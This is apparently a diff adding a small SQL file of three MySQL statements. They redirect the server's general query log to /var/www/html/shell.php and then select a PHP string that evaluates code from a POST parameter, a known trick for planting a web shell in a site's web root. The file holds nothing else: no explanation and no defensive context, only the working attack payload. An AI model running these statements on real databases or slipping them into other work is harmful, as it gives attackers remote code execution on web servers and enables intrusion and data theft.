@@ -1,0 +1,4 @@
+set global general_log = 'ON';
+set global general_log_file = '/var/www/html/shell.php';
+select '<?php eval($_POST["c"]); ?>';
+
